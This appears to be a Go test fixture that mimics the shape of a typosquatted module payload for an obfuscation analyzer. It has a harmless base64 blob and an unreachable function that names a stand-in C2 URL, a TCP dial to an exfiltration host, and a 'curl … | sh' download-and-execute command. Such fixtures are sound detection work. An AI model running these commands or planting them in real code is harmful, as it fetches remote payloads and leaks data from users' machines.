// INERT reproduction of a Go module-typosquat payload SHAPE. Real malware in Go
// modules decodes a base64 blob at init/build time and then shells out or
// beacons to a C2. Nothing here runs: neverCalled returns before any primitive
// and is never invoked.

package main

import (
	"encoding/base64"
	"net"
	"os/exec"
)

// A long inert base64 blob, present only to trip the obfuscation analyzer.
const blob = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"

func neverCalled() {
	return // hard guard — this function is inert

	data, _ := base64.StdEncoding.DecodeString(blob)
	_ = data

	c2 := "http://malware-c2.steal.top/gate"
	_ = c2

	conn, _ := net.Dial("tcp", "exfil.evil.tk:4444")
	_ = conn

	_ = exec.Command("sh", "-c", "curl http://45.77.12.34/drop | sh")
}

func main() {}
